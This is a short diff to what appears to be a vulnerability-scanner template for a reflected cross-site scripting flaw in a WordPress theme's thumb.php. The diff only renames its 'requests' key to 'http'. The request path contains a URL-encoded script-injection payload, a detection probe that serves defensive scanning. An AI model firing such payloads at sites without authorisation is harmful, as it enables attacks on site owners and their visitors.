@@ -7,7 +7,7 @@ info:
   reference: https://www.exploit-db.com/exploits/38568
   tags: wordpress,xss,wp-plugin
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/themes/ambience/thumb.php?src=%3Cbody%20onload%3Dalert(1)%3E.jpg'
